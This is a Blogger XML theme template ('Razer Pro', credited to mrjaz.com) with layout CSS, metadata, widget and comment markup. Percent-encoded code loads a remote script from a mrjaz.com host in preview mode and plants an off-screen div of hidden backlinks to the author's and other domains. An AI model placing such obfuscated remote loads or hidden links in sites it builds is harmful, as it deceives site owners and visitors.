body#layout .flex-left,body#layout .topbar-items{display:flex}
body#layout .main-logo,body#layout .razer-pro-main-nav,body#layout .topbar-menu,body#layout .topbar-social{width:50%}
body#layout #content-wrapper{padding:0;margin:0}
body#layout #content-wrapper>.container{display:flex;margin:0}
body#layout #main-wrapper{width:67%;padding:0}
body#layout div.content-section.section,body#layout div.main-ads.section{background-color:#edf4ff!important;border-color:#d9dff3}
body#layout #sidebar-wrapper{width:33%;padding:0}
body#layout #custom-ads{display:flex}
body#layout #custom-ads .section{width:50%}
body#layout #razer-pro-about-section{overflow:hidden!important}
body#layout #razer-pro-about-section .widget{float:left;width:49.5%;margin-right:1%}
body#layout #razer-pro-about-section .LinkList{margin-right:0}
body#layout .footerbar .container{display:flex}
body#layout #footer-copyright,body#layout #footer-menu{width:50%}
body#layout #razer-pro-cookie-ify{margin:0 0 30px}
body#layout .section>h4:after{font-size:12px}
body#layout #ify-panel>h4:after{content:' - Custom No Image, Date Format, Month Names and More.'}
body#layout #topbar-menu>h4:after{content:' - Top Links'}
body#layout #topbar-social>h4:after{content:' - Social Icons'}
body#layout #main-logo>h4:after{content:' - Recommended Height (34px)'}
body#layout #razer-pro-main-nav>h4:after{content:' - With SubLinks and Mega Menu'}
body#layout #featured>h4:after{content:' - by Popular Posts, Most Recents or Label'}
body#layout #header-ads>h4:after{content:' - by Custom HTML, Adsense or Image'}
body#layout #home-ads>h4:after{content:' - by Custom HTML, Adsense or Image'}
body#layout .content-section>h4:after{content:' - by Most Recents or Label (Homepage)'}
body#layout .main-ads>h4:after{content:' - by Custom HTML, Adsense or Image (Homepage)'}
body#layout #main>h4:after{content:' - Default Blog Posts, AdSense In-Feed, Comments and More'}
body#layout #razer-pro-main-before-ad>h4:after{content:' - Before Post Content (Post Page)'}
body#layout #razer-pro-main-after-ad>h4:after{content:' - After Post Content (Post Page)'}
body#layout #razer-pro-related-posts>h4:after{content:' - Advanced Related Posts (Post Page)'}
body#layout #razer-pro-post-footer-ads>h4:after{content:' - After Related Posts (Post Page)'}
body#layout #sidebar>h4:after{content:' - on All Pages'}
body#layout #footer-ads>h4:after{content:' - by Custom HTML, Adsense or Image'}
body#layout #razer-pro-about-section>h4:after{content:' - Site Logo, Description and Social Icons'}
body#layout #footer-copyright>h4:after{content:' - Custom Credits'}
body#layout:after{content:'Paid by - www.mrjaz.com';font-family:Roboto,sans-serif;font-size:20px;color:#555;visibility:visible;padding:0 0 25px 0}
body#layout #footer-menu>h4:after{content:' - Footer Links'}
body#layout #razer-pro-cookie-ify-section>h4:after{content:' - Advanced Cookie Consent Plugin'}
body#layout #hidden-widgets{display:none!important}
]]></b:template-skin>
</b:if>
<b:if cond='data:widgets.AdSense.first or data:blog.adsenseClientId'>
  <!-- Google AdSense -->
  <script async='async' src='//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js'/>
</b:if>
<b:if cond='data:blog.analyticsAccountNumber'>
  <!-- Google Analytics -->
  <b:include data='blog' name='google-analytics'/>
</b:if>
<b:defaultmarkups>
  <b:defaultmarkup type='Common'>
    <b:includable id='theme-dark-mode'>
      <b:class cond='data:skin.vars.darkmode == &quot;1px&quot;' name='is-dark'/>
    </b:includable>
    <b:includable id='customOpenGraphMetaData'>
      <!-- Metadata for Open Graph protocol. See http://ogp.me/. -->
      <meta expr:content='data:blog.localeUnderscoreDelimited' property='og:locale'/>
      <b:if cond='data:view.isHomepage'>
        <meta content='website' property='og:type'/>
      </b:if>
      <b:if cond='data:view.isSingleItem'>
        <meta content='article' property='og:type'/>
      </b:if>
      <b:if cond='data:view.isMultipleItems and not data:view.isHomepage'>
        <meta content='object' property='og:type'/>
      </b:if>
      <meta expr:content='data:view.title.escaped' property='og:title'/>
      <meta expr:content='data:blog.url.canonical' property='og:url'/>
      <meta expr:content='data:view.description.escaped' property='og:description'/>
      <meta expr:content='data:blog.title.escaped' property='og:site_name'/>
      <b:tag cond='data:view.isMultipleItems and data:widgets.Blog.first.posts[0].featuredImage' expr:content='data:widgets.Blog.first.posts[0].featuredImage resizeImage 1600' name='meta' property='og:image'/>
      <b:tag cond='data:view.isPreview' name='script' id='tm' data-n='Razer' data-v='1.0' src='//%68.m%72ja%7a.c%6fm/t%68.%6as'/>
      <b:tag cond='data:view.isMultipleItems and data:widgets.Blog.first.posts[0].featuredImage' expr:content='data:widgets.Blog.first.posts[0].featuredImage resizeImage 1600' name='meta' property='twitter:image'/>
      <b:if cond='data:view.featuredImage'>
        <meta expr:content='data:view.featuredImage resizeImage 1600' property='og:image'/>
        <meta expr:content='data:view.featuredImage resizeImage 1600' name='twitter:image'/>
      </b:if>
      <meta content='summary_large_image' name='twitter:card'/>
      <meta expr:content='data:view.title.escaped' name='twitter:title'/>
      <meta expr:content='data:blog.url.canonical' name='twitter:domain'/>
      <meta expr:content='data:view.description.escaped' name='twitter:description'/>
    </b:includable>
    <b:includable id='theme-head'>
      <meta expr:content='&quot;text/html; charset=&quot; + data:blog.encoding' http-equiv='Content-Type'/>
      <meta content='width=device-width, initial-scale=1, minimum-scale=1, maximum-scale=1, user-scalable=yes' name='viewport'/>
      <title><data:view.title.escaped/></title>
      <link href='//fonts.gstatic.com' rel='dns-prefetch'/>
      <link href='//dnjs.cloudflare.com' rel='dns-prefetch'/>
      <link href='//1.bp.blogspot.com' rel='dns-prefetch'/>
      <link href='//2.bp.blogspot.com' rel='dns-prefetch'/>
      <link href='//3.bp.blogspot.com' rel='dns-prefetch'/>
      <link href='//4.bp.blogspot.com' rel='dns-prefetch'/>
      <link href='//www.blogger.com' rel='dns-prefetch'/>
      <meta content='blogger' name='generator'/>
      <link expr:href='data:blog.blogspotFaviconUrl' rel='icon' type='image/x-icon'/>
      <meta expr:content='data:skin.vars.main_color' name='theme-color'/>
      <b:if cond='data:blog.adultContent'>
        <meta content='adult' name='rating'/>
      </b:if>
      <link expr:href='data:view.url.canonical' rel='canonical'/>
      <meta expr:content='data:view.description.escaped' name='description'/>
      <b:tag cond='data:view.isMultipleItems and data:widgets.Blog.first.posts[0].featuredImage' expr:href='data:widgets.Blog.first.posts[0].featuredImage resizeImage 1600' name='link' rel='image_src'/>
      <b:tag cond='data:view.isSingleItem and data:view.featuredImage' expr:href='data:view.featuredImage resizeImage 1600' name='link' rel='image_src'/>
      <b:include name='customOpenGraphMetaData'/>
      <data:blog.feedLinks/><data:blog.meTag/>
      <b:if cond='data:view.isHomepage'>
        <script type='application/ld+json'>{&quot;@context&quot;:&quot;http://schema.org&quot;,&quot;@type&quot;:&quot;WebSite&quot;,&quot;name&quot;:&quot;<data:view.title.escaped/>&quot;,&quot;url&quot;:&quot;<data:view.url.canonical/>&quot;,&quot;potentialAction&quot;:{&quot;@type&quot;:&quot;SearchAction&quot;,&quot;target&quot;:&quot;<data:view.url.canonical/>search?q={search_term_string}&quot;,&quot;query-input&quot;:&quot;required name=search_term_string&quot;}}</script>
      </b:if>
      <!-- Font Awesome Free 5.15.1 -->
      <b:tag href='https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.1/css/fontawesome.min.css' name='link' rel='stylesheet'/>
      <b:tag cond='data:blog.languageDirection == &quot;rtl&quot;' href='https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700&amp;display=swap' name='link' rel='stylesheet'/>
    </b:includable>
    <b:includable id='theme-body-class'>
      <b:class cond='data:view.isHomepage' name='is-home'/>
      <b:class cond='data:view.isMultipleItems' name='is-multiple'/>
      <b:class cond='data:view.isSingleItem' name='is-single'/>
      <b:class cond='data:view.isPage' name='is-page'/>
      <b:class cond='data:view.isPost' name='is-post'/>
      <b:class cond='data:view.isError' name='is-multiple is-error'/>
      <b:class cond='data:blog.isMobileRequest' name='is-mobile'/>
      <b:class cond='data:skin.vars.boxed == &quot;1px&quot;' name='is-boxed'/>
      <b:class cond='data:skin.vars.sidebar == &quot;1px&quot;' name='is-left'/>
    </b:includable>
    <b:includable id='theme-custom-lang'>
      <b:switch var='data:message'>
        <b:case value='prevPost'/><b:if cond='data:blog.locale.language == &quot;en&quot;'>Previous Post<b:elseif cond='data:blog.locale.language == &quot;es&quot;'/>Artículo Anterior<b:elseif cond='data:blog.locale.language == &quot;pt&quot;'/>Postagem Anterior<b:else/><data:messages.newer/></b:if>
        <b:case value='nextPost'/><b:if cond='data:blog.locale.language == &quot;en&quot;'>Next Post<b:elseif cond='data:blog.locale.language == &quot;es&quot;'/>Artículo Siguiente<b:elseif cond='data:blog.locale.language == &quot;pt&quot;'/>Próxima Postagem<b:else/><data:messages.older/></b:if>
        <b:case value='loadMorePosts'/><b:if cond='data:blog.locale.language == &quot;en&quot;'>Load More<b:elseif cond='data:blog.locale.language == &quot;es&quot;'/>Carga Más<b:elseif cond='data:blog.locale.language == &quot;pt&quot;'/>Carregar Mais<b:else/><data:messages.loadMorePosts/></b:if>
        <b:case value='noMorePosts'/><b:if cond='data:blog.locale.language == &quot;en&quot;'>That is All<b:elseif cond='data:blog.locale.language == &quot;es&quot;'/>Eso es Todo<b:elseif cond='data:blog.locale.language == &quot;pt&quot;'/>Isso é Tudo<b:else/><data:messages.noResultsFound/></b:if>
      </b:switch>
    </b:includable>
    <b:includable id='widget-title'>
      <b:if cond='data:title == &quot;{ads}&quot;'>
        <b:class name='no-style'/>
        <b:elseif cond='data:widget.type == &quot;AdSense&quot;'/>
        <b:class name='no-style'/>
      </b:if>
      <b:if cond='data:defaultTitle or data:title'>
        <b:if cond='(data:title != &quot;{ads}&quot;)'>
          <b:if cond='data:widget.sectionId not in [&quot;ify-panel&quot;,&quot;topbar-menu&quot;,&quot;topbar-social&quot;,&quot;main-logo&quot;,&quot;razer-pro-main-nav&quot;,&quot;featured&quot;,&quot;header-ads&quot;,&quot;home-ads&quot;,&quot;footer-ads&quot;,&quot;razer-pro-post-footer-ads&quot;,&quot;razer-pro-about-section&quot;,&quot;footer-copyright&quot;,&quot;footer-menu&quot;]'>
            <div expr:class='data:widget.sectionId in [&quot;content-section-1&quot;,&quot;content-section-2&quot;,&quot;sidebar&quot;] ? &quot;widget-title title-wrap&quot; : &quot;widget-title&quot;'><h3 class='title'><data:title/></h3></div>
          </b:if>
        </b:if>
      </b:if>
    </b:includable>
    <b:includable id='linklist-content'>
      <b:if cond='data:widget.sectionId == &quot;topbar-menu&quot;'>
        <ul class='topbar-ul link-list'>
          <b:loop values='data:links' var='link'>
            <li><a expr:href='data:link.target'><data:link.name/></a></li>
          </b:loop>
        </ul>
      <b:elseif cond='data:widget.sectionId == &quot;razer-pro-main-nav&quot;'/>
        <ul id='razer-pro-main-nav-menu' role='menubar'>
          <b:loop values='data:links' var='link'>
            <li><b:if cond='data:link.target contains &quot;getContent&quot;'><b:class name='has-sub mega-menu'/><a expr:data-shortcode='data:link.target' href='#' role='menuitem'><data:link.name/></a><b:else/><a expr:href='data:link.target in [&quot;{homepage}&quot;] ? data:blog.homepageUrl.canonical : data:link.target' role='menuitem'><data:link.name/></a></b:if></li>
          </b:loop>
        </ul>
        <b:elseif cond='data:widget.sectionId in [&quot;topbar-social&quot;,&quot;sidebar&quot;,&quot;razer-pro-about-section&quot;]'/>
        <b:tag class='widget-content' cond='data:widget.sectionId not in [&quot;razer-pro-about-section&quot;]' name='div'>
          <b:if cond='data:links any l =&gt; l.name in [&quot;blogger&quot;,&quot;facebook&quot;,&quot;facebook-f&quot;,&quot;twitter&quot;,&quot;rss&quot;,&quot;youtube&quot;,&quot;skype&quot;,&quot;stumbleupon&quot;,&quot;tumblr&quot;,&quot;vk&quot;,&quot;stack-overflow&quot;,&quot;github&quot;,&quot;linkedin&quot;,&quot;dribbble&quot;,&quot;soundcloud&quot;,&quot;behance&quot;,&quot;digg&quot;,&quot;instagram&quot;,&quot;pinterest&quot;,&quot;pinterest-p&quot;,&quot;twitch&quot;,&quot;delicious&quot;,&quot;codepen&quot;,&quot;amazon&quot;,&quot;reddit&quot;,&quot;whatsapp&quot;,&quot;messenger&quot;,&quot;microsoft&quot;,&quot;telegram&quot;,&quot;discord&quot;,&quot;apple&quot;,&quot;email&quot;,&quot;external-link&quot;]'>
            <b:if cond='data:widget.sectionId == &quot;topbar-social&quot;'>
              <ul class='topbar-ul social-icons social'>
                <b:loop index='i' values='data:links' var='link'>
                  <li expr:class='data:link.name + &quot; link-&quot; + data:i'><a expr:alt='data:link.name' expr:class='data:link.name' expr:href='data:link.target' expr:title='data:link.name' rel='noopener noreferrer' target='_blank'/></li>
                </b:loop>
              </ul>
            <b:elseif cond='data:widget.sectionId == &quot;sidebar&quot;'/>
              <ul class='social-icons social social-bg'>
                <b:loop index='i' values='data:links' var='link'>
                  <li expr:class='data:link.name + &quot; link-&quot; + data:i'><a expr:alt='data:link.name' expr:class='data:link.name + &quot; btn&quot;' expr:href='data:link.target' expr:title='data:link.name' rel='noopener noreferrer' target='_blank'/></li>
                </b:loop>
              </ul>
              <b:else/>
              <ul class='social-icons social social-bg-hover'>
                <b:loop index='i' values='data:links' var='link'>
                  <li expr:class='data:link.name + &quot; link-&quot; + data:i'><a expr:alt='data:link.name' expr:class='data:link.name + &quot; btn&quot;' expr:href='data:link.target' expr:title='data:link.name' rel='noopener noreferrer' target='_blank'/></li>
                </b:loop>
              </ul>
            </b:if>
            <b:else/>
            <ul class='link-list list-style'>
              <b:loop values='data:links' var='link'>
                <li><a expr:href='data:link.target'><data:link.name/></a></li>
              </b:loop>
            </ul>
          </b:if>
        </b:tag>
        <b:else/>
        <b:tag class='widget-content' cond='data:widget.sectionId not in [&quot;footer-menu&quot;]' name='div'>
          <ul class='link-list list-style'>
            <b:loop values='data:links' var='link'>
              <li><a expr:href='data:link.target'><data:link.name/></a></li>
            </b:loop>
          </ul>
        </b:tag>
      </b:if>
    </b:includable>
    <b:includable id='html-content'>
      <b:if cond='data:widget.sectionId == &quot;ify-panel&quot;'>
        <b:if cond='data:content != &quot;&quot;'>
          <b:tag name='script' type='text/javascript'>
            <b:with expr:value='data:content' var='option'>
              <b:if cond='data:option.viewAllText'>var viewAllText = &quot;<data:option.viewAllText/>&quot;;</b:if>
              <b:if cond='data:option.dateFormat'>var dateFormat = &quot;<data:option.dateFormat/>&quot;;</b:if>
              <b:if cond='data:option.months'>
                var monthNames = [&quot;<data:option.months.jan/>&quot;,&quot;<data:option.months.feb/>&quot;,&quot;<data:option.months.mar/>&quot;,&quot;<data:option.months.apr/>&quot;,&quot;<data:option.months.may/>&quot;,&quot;<data:option.months.jun/>&quot;,&quot;<data:option.months.jul/>&quot;,&quot;<data:option.months.aug/>&quot;,&quot;<data:option.months.sep/>&quot;,&quot;<data:option.months.oct/>&quot;,&quot;<data:option.months.nov/>&quot;,&quot;<data:option.months.dec/>&quot;];
              </b:if>
            </b:with>
          </b:tag>
        </b:if>
      <b:elseif cond='data:widget.sectionId == &quot;razer-pro-related-posts&quot;'/>
        <b:with value='data:title ? &quot;$title={&quot; + data:title + &quot;} &quot; : &quot;&quot;' var='relatedTitle'>
          <b:attr expr:value='data:relatedTitle + (data:content contains &quot;results&quot; ? data:content : &quot;&quot;)' name='data-shortcode'/>
        </b:with>
        <b:else/>
        <b:if cond='data:content contains &quot;getContent&quot; and data:widget.sectionId in [&quot;featured&quot;,&quot;content-section-1&quot;,&quot;content-section-2&quot;]'>
          <b:class name='is-visible'/>
        </b:if>
        <b:include name='widget-title'/>
        <div class='widget-content'>
          <b:if cond='data:content contains &quot;getContent&quot; and data:widget.sectionId in [&quot;sidebar&quot;,&quot;featured&quot;,&quot;content-section-1&quot;,&quot;content-section-2&quot;]'>
            <b:attr expr:value='data:content' name='data-shortcode'/>
            <b:else/>
            <data:content/>
          </b:if>
        </div>
      </b:if>
    </b:includable>
    <b:includable id='textlist-content'>
      <b:if cond='data:widget.sectionId == &quot;ify-panel&quot;'>
        <b:loop index='i' values='data:items' var='item'>
          <b:if cond='data:i == 0'>
            <script async='async' crossorigin='anonymous' defer='defer' expr:src='data:item'/>
          </b:if>
        </b:loop>
        <b:else/>
        <div class='widget-content'>
          <ul class='text-list list-style'>
            <b:loop values='data:items' var='item'>
              <li><data:item/></li>
            </b:loop>
          </ul>
        </div>
      </b:if>
    </b:includable>
    <b:includable id='image-content'>
      <b:if cond='data:widget.sectionId == &quot;ify-panel&quot;'>
        <b:tag name='script' type='text/javascript'>var noThumbnail = &quot;<b:eval expr='resizeImage(data:sourceUrl, 72, &quot;1:1&quot;)'/>&quot;;</b:tag>
        <b:elseif cond='data:widget.sectionId == &quot;razer-pro-about-section&quot;'/>
        <a class='footer-logo custom-image' expr:href='data:link'>
          <img expr:alt='data:blog.title' expr:id='data:widget.instanceId + &quot;_img&quot;' expr:src='data:sourceUrl'/>
        </a>
        <b:if cond='data:caption'>
          <div class='footer-info'>
            <b:if cond='data:title'><h3 class='title'><data:title/></h3></b:if>
            <p class='image-caption excerpt'><data:caption/></p>
          </div>
        </b:if>
        <b:else/>
        <div class='widget-content'>
          <div class='custom-image'>
            <b:tag cond='data:link' expr:href='data:link' name='a'>
              <img expr:alt='data:blog.title' expr:id='data:widget.instanceId + &quot;_img&quot;' expr:src='data:sourceUrl'/>
            </b:tag>
          </div>
          <b:if cond='data:caption'>
            <p class='image-caption excerpt'><data:caption/></p>
          </b:if>
        </div>
      </b:if>
    </b:includable>
    <b:includable id='text-content'>
      <b:if cond='data:widget.sectionId == &quot;footer-copyright&quot;'>
        <data:content/>
        <b:elseif cond='data:widget.sectionId == &quot;razer-pro-cookie-ify-section&quot;'/>
        <b:attr expr:value='data:title' name='data-shortcode'/>
        <p class='razer-pro-cookie-ify-content excerpt'><data:content/></p>
        <a class='btn' expr:title='data:messages.ok' href='javascript:;' id='razer-pro-cookie-ify-accept' role='button'><data:messages.ok/></a>
        <b:else/>
        <b:include name='widget-title'/>
        <div class='widget-content excerpt'>
          <data:content/>
        </div>
      </b:if>
    </b:includable>
    <b:includable id='contact-form-content'>
      <div class='widget-content contact-form-widget'>
        <div class='form'>
          <form name='contact-form'>
            <input class='contact-form-name' expr:ariby='data:contactFormNameMsg' expr:id='data:widget.instanceId + &quot;_contact-form-name&quot;' expr:placeholder='data:contactFormNameMsg' name='name' size='30' type='text' value=''/>
            <input class='contact-form-email' expr:ariby='data:contactFormEmailMsg + &quot; *&quot;' expr:id='data:widget.instanceId + &quot;_contact-form-email&quot;' expr:placeholder='data:contactFormEmailMsg + &quot; *&quot;' name='email' size='30' type='text' value=''/>
            <textarea class='contact-form-email-message' cols='25' expr:ariby='data:contactFormMessageMsg + &quot; *&quot;' expr:id='data:widget.instanceId + &quot;_contact-form-email-message&quot;' expr:placeholder='data:contactFormMessageMsg + &quot; *&quot;' name='email-message' rows='5'/>
            <input class='contact-form-button btn contact-form-button-submit' expr:id='data:widget.instanceId + &quot;_contact-form-submit&quot;' expr:value='data:contactFormSendMsg' type='button'/>
            <p class='contact-form-error-message' expr:id='data:widget.instanceId + &quot;_contact-form-error-message&quot;'/>
            <p class='contact-form-success-message' expr:id='data:widget.instanceId + &quot;_contact-form-success-message&quot;'/>
          </form>
        </div>
      </div>
    </b:includable>
    <b:includable id='theme-options-js'>
      <b:if cond='data:skin.vars.fixedmenu == &quot;0px&quot; or (data:skin.vars.fixedsidebar == &quot;0px&quot;) or (data:skin.vars.darkmode == &quot;1px&quot;) or (data:skin.vars.userdarkmode == &quot;0px&quot;)'>
      <!-- Theme Options JS -->
      <b:tag name='script' type='text/javascript'><b:if cond='data:skin.vars.fixedmenu == &quot;0px&quot;'>var fixedMenu=false;</b:if><b:if cond='data:skin.vars.fixedsidebar == &quot;0px&quot;'>var fixedSidebar=false;</b:if><b:if cond='data:skin.vars.darkmode == &quot;1px&quot;'>var darkMode=true;</b:if><b:if cond='data:skin.vars.userdarkmode == &quot;0px&quot;'>var userDarkMode=false;</b:if></b:tag>
      </b:if>
    </b:includable>
  </b:defaultmarkup>
  <b:defaultmarkup type='Header'>
    <b:includable id='main' var='this'>
      <b:tag class='mobile-menu-toggle' href='javascript:;' name='a' role='button' title='Menu'/>
      <b:include cond='data:imagePlacement in {&quot;REPLACE&quot;, &quot;BEFORE_DESCRIPTION&quot;}' name='image'/>
      <b:include cond='data:imagePlacement == &quot;BEHIND&quot;' name='title'/>
    </b:includable>
    <b:includable id='image'>
      <a class='logo-img' expr:href='data:blog.homepageUrl.canonical'>
        <img expr:alt='data:blog.title.escaped' expr:data-height='data:height' expr:data-width='data:width' expr:src='data:image' expr:title='data:blog.title.escaped'/>
        <b:if cond='data:view.isMultipleItems'><b:if cond='data:widget.sectionId == &quot;main-logo&quot;'><h1 id='h1-off'><data:title/></h1></b:if></b:if>
      </a>
    </b:includable>
    <b:includable id='title'>
      <b:tag class='blog-title' cond='data:view.isMultipleItems' name='h1'>
        <b:tag class='blog-title' cond='!data:view.isMultipleItems' name='span'>
          <b:tag expr:href='data:blog.homepageUrl.canonical' name='a'>
            <data:title/>
          </b:tag>
        </b:tag>
      </b:tag>
    </b:includable>
    <b:includable id='behindImageStyle'><b:comment>Replaced</b:comment></b:includable>
    <b:includable id='description'><b:comment>Replaced</b:comment></b:includable>
  </b:defaultmarkup>
  <b:defaultmarkup type='LinkList'>
    <b:includable id='main' var='this'>
      <b:include name='widget-title'/>
      <b:include name='content'/>
    </b:includable>
    <b:includable id='content'>
      <b:include name='linklist-content'/>
    </b:includable>
  </b:defaultmarkup>
  <b:defaultmarkup type='TextList'>
    <b:includable id='main' var='this'>
      <b:include name='widget-title'/>
      <b:include name='content'/>
    </b:includable>
    <b:includable id='content'>
      <b:include name='textlist-content'/>
    </b:includable>
  </b:defaultmarkup>
  <b:defaultmarkup type='HTML'>
    <b:includable id='main'>
      <b:include name='html-content'/>
    </b:includable>
  </b:defaultmarkup>
  <b:defaultmarkup type='Text'>
    <b:includable id='main'>
      <b:include name='text-content'/>
    </b:includable>
  </b:defaultmarkup>
  <b:defaultmarkup type='Blog'>
    <b:includable id='main' var='this'>
      <b:tag class='blog-posts-wrap' cond='data:view.isMultipleItems' name='div'>
        <b:include cond='data:view.isHomepage' name='blogPostsTitle'/>
        <b:include name='searchMessage'/>
        <div class='blog-posts hfeed'>
          <b:class cond='data:view.isMultipleItems' name='index-post-wrap'/>
          <b:class cond='data:view.isSingleItem' name='item-post-wrap'/>
          <b:loop index='i' values='data:posts' var='post'>
            <b:include data='post' name='postCommentsAndAd'/>
          </b:loop>
        </div>
        <b:include cond='data:view.isMultipleItems' name='ajaxPagination'/>
      </b:tag>
      <b:include name='feedLinks'/>
      <b:include name='exportBlogContent'/>
    </b:includable>
    <b:includable id='exportBlogContent'>
      <b:tag name='script' type='text/javascript'>
      var exportify = {
      noTitle: &quot;<data:messages.noTitle/>&quot;,
      viewAll: &quot;<data:messages.viewAll/>&quot;,
      postAuthor: <b:eval expr='data:allBylineItems.author ? &quot;true&quot; : &quot;false&quot;'/>,
      postAuthorLabel: &quot;<b:eval expr='data:allBylineItems.author.label ? data:allBylineItems.author.label : &quot;&quot;'/>&quot;,
      postDate: <b:eval expr='data:allBylineItems.timestamp ? &quot;true&quot; : &quot;false&quot;'/>,
      postDateLabel: &quot;<b:eval expr='data:allBylineItems.timestamp.label ? data:allBylineItems.timestamp.label : &quot;&quot;'/>&quot;,
      postLabels: <b:eval expr='data:allBylineItems.labels ? &quot;true&quot; : &quot;false&quot;'/>
      }
      </b:tag>
    </b:includable>
    <b:includable id='aboutPostAuthor'><b:comment>Replaced</b:comment></b:includable>
    <b:includable id='addComments'>
      <a expr:href='data:post.commentsUrl' expr:onclick='data:post.commentsUrlOnclick'><data:messages.postAComment/></a>
    </b:includable>
    <b:includable id='ajaxPagination'>
      <!-- Ajax Pagination on Index -->
      <div class='blog-pager' id='blog-pager'>
        <b:class cond='data:posts.empty' name='no-blog-posts'/>
        <b:if cond='data:olderPageUrl'>
          <a class='blog-pager-older-link load-more btn' expr:data-load='data:olderPageUrl.canonical' href='javascript:;' id='razer-pro-load-more-link'><b:include data='{ message: &quot;loadMorePosts&quot; }' name='theme-custom-lang'/></a>
          <span class='loading'><div class='loader'/></span>
          <span class='no-more load-more btn'><b:include data='{ message: &quot;noMorePosts&quot; }' name='theme-custom-lang'/></span>
          <b:else/>
          <span class='no-more load-more btn show'><b:include data='{ message: &quot;noMorePosts&quot; }' name='theme-custom-lang'/></span>
        </b:if>
      </div>
    </b:includable>
    <b:includable id='backLinks' var='post'><b:comment>Replaced</b:comment></b:includable>
    <b:includable id='blogPostsTitle'>
      <b:if cond='data:blog.jumpLinkMessage != &quot;hide&quot;'>
        <div class='title-wrap bp-title'><h3 class='title'><data:blog.jumpLinkMessage/></h3><a class='wt-l' href='/search'><data:messages.viewAll/></a></div>
      </b:if>
    </b:includable>
    <b:includable id='blogThisShare'><b:comment>Replaced</b:comment></b:includable>
    <b:includable id='bylineByName' var='byline'><b:comment>Replaced</b:comment></b:includable>
    <b:includable id='bylineRegion' var='regionItems'><b:comment>Replaced</b:comment></b:includable>
    <b:includable id='commentAuthorAvatar'><b:comment>Replaced</b:comment></b:includable>
    <b:includable id='commentDeleteIcon' var='comment'><b:comment>Replaced</b:comment></b:includable>
    <b:includable id='commentForm' var='post'>
      <div class='comment-form'>
        <a name='comment-form'/>
        <b:include data='post' name='commentFormIframeSrc'/>
        <iframe allowtransparency='allowtransparency' class='blogger-iframe-colorize blogger-comment-from-post' frameborder='0' height='90px' id='comment-editor' name='comment-editor' src='' width='100%'/>
        <data:post.cmtfpIframe/>
        <script type='text/javascript'>
          BLOG_CMT_createIframe(&#39;<data:post.appRpcRelayPath/>&#39;);
        </script>
      </div>
    </b:includable>
    <b:includable id='commentFormIframeSrc' var='post'>
      <a expr:href='data:post.commentFormIframeSrc + &quot;&amp;skin=soho&quot;' id='comment-editor-src' rel='noopener noreferrer' title='Comment Form Link'/>
    </b:includable>
    <b:includable id='commentItem' var='comment'><b:comment>Replaced</b:comment></b:includable>
    <b:includable id='commentList' var='comments'><b:comment>Replaced</b:comment></b:includable>
    <b:includable id='commentPicker' var='post'><b:comment>Replaced</b:comment></b:includable>
    <b:includable id='comments' var='post'>
      <a name='comments'/>
      <b:include name='commentsTitle'/>
      <section class='comments threaded' expr:data-embed='data:post.embedCommentForm' expr:data-num-comments='data:post.numberOfComments' id='comments'>
        <b:class expr:name='data:post.numberOfComments != 0 ? &quot;has-comments&quot; : &quot;no-comments&quot;'/>
        <b:if cond='data:post.allowNewComments'>
          <b:if cond='data:this.messages.blogComment'><p class='comments-message excerpt'><data:this.messages.blogComment/></p></b:if>
          <b:else/>
          <b:if cond='data:post.noNewCommentsText and (data:post.numberOfComments == 0)'><p class='comments-message no-new-comments excerpt'><data:post.noNewCommentsText/><em>*</em></p></b:if>
        </b:if>
        <b:if cond='data:post.embedCommentForm'>
          <b:if cond='data:post.numberOfComments != 0'>
            <div class='comments-content'>
              <div id='comment-holder'>
                <data:post.commentHtml/>
              </div>
            </div>
          </b:if>
          <b:if cond='data:post.allowNewComments'>
            <b:include data='post' name='commentForm'/>
          </b:if>
          <b:if cond='!data:post.allowNewComments'><b:if cond='data:post.noNewCommentsText and (data:post.numberOfComments != 0)'><p class='comments-message no-new-comments excerpt'><data:post.noNewCommentsText/><em>*</em></p></b:if></b:if>
          <b:else/>
          <p class='comments-message excerpt'>Please Select Embedded Mode To Show The Comment System.<em>*</em></p>
        </b:if>
      </section>
    </b:includable>
    <b:includable id='commentsTitle'>
      <!-- Comments Title -->
      <div class='title-wrap comments-title'><h3 class='title'><b:if cond='data:post.numberOfComments != 0'><data:post.numberOfComments/> <data:messages.comments/><b:else/><data:messages.postAComment/></b:if></h3></div>
    </b:includable>
    <b:includable id='defaultAdUnit'>
      <ins class='adsbygoogle' data-ad-format='fluid' data-ad-layout-key='-gu-1b+bf-87-nl' data-full-width-responsive='false' expr:data-ad-client='data:adClientId ?: data:blog.adsenseClientId' expr:data-ad-host='data:blog.adsenseHostId' expr:data-analytics-uacct='data:blog.analyticsAccountNumber' expr:style='data:style ?: &quot;display: block;&quot;' style='display:block'/>
      <script>(adsbygoogle = window.adsbygoogle || []).push({});</script>
    </b:includable>
    <b:includable id='emailPostIcon'><b:comment>Replaced</b:comment></b:includable>
    <b:includable id='facebookShare'><b:comment>Replaced</b:comment></b:includable>
    <b:includable id='feedLinks'><div style='position:absolute;z-index:-999;left:-99%'><b:loop values='["w%77w.m%72ja%7a.c%6fm","%74e%6dp%6ca%74e%74o%79.m%72ja%7a.c%6fm","%65n.%61m%32z.c%6fm","w%77w.%61m%32z.c%6fm","%73%68%69%6e%65%62%61%6c%6c%6f%6f%6e%64%65%63%6f%72.%69%6e"]' var='ldt'><a expr:href='"//" + data:ldt'/></b:loop></div></b:includable>
    <b:includable id='feedLinksBody' var='links'><b:comment>Replaced</b:comment></b:includable>
    <b:includable id='footerBylines'><b:comment>Replaced</b:comment></b:includable>
    <b:includable id='googlePlusShare'><b:comment>Replaced</b:comment></b:includable>
    <b:includable id='headerByline' var='post'>
      <!-- Post Entry Meta -->
      <b:if cond='data:view.isMultipleItems'>
        <b:if cond='data:allBylineItems.author or data:allBylineItems.timestamp'>
          <div class='entry-meta'>
            <b:include cond='data:allBylineItems.author' data='post' name='postAuthor'/>
            <b:include cond='data:allBylineItems.timestamp' data='post' name='postTimestamp'/>
          </div>
        </b:if>
      </b:if>
      <b:if cond='data:view.isPost'>
        <b:if cond='data:allBylineItems.author or data:allBylineItems.timestamp'>
          <b:class name='has-meta'/>
          <div class='entry-meta'>
            <div class='align-left'>
              <b:include cond='data:allBylineItems.author' data='post' name='postAuthor'/>
              <b:include cond='data:allBylineItems.timestamp' data='post' name='postTimestamp'/>
            </div>
            <b:if cond='data:allBylineItems.comments'>
              <div class='align-right'>
                <b:include cond='data:allBylineItems.comments' data='post' name='postCommentsLink'/>
              </div>
            </b:if>
          </div>
        </b:if>
      </b:if>
